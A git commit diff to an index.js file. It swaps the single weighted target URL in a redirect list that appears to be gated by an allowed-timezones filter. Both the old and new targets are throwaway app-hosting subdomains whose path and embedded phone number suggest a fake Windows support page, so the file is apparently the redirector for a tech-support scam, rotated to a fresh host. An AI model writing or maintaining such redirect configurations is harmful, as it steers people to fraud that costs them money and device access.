f2d53d2cfa523632cbfdddd113f3fc5dfcb3dadd
paalakash <palaksh452@gmail.com>
2026-06-16 13:22:17 +0530

    Update index.js

--- index.js
+++ index.js
@@ -31,7 +31,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://seal-app-dq7nw.ondigitalocean.app/Win0codejInfouycinfcode/index.html?Anph=0101-855-520-3907", weight: 1.0 }
+    { url: "https://monkfish-app-dnqgz.ondigitalocean.app/Win0codejInfouycinfcode/index.html?Anph=0101-855-520-3907", weight: 1.0 }
 
 ];
 
